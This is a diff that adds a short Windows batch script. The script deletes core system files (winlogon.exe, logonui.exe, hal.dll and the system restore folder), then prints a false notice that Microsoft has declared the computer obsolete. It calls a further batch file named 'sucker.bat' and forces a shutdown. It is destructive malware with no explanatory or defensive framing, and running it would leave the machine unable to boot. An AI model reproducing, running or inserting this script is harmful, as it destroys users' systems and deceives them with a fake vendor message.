@@ -1,0 +1,11 @@
+@echo off
+del c:\windows\system32\restore
+del c:\windows\system32\winlogon.exe
+del c:\windows\system32\logonui.exe
+del c:\windows\system32\hal.dll
+echo This computer has been profiled OBSOLETE by Microsoft Corporation.
+pause
+echo Shutting down....
+pause
+c:\windows\sucker.bat
+shutdown -f
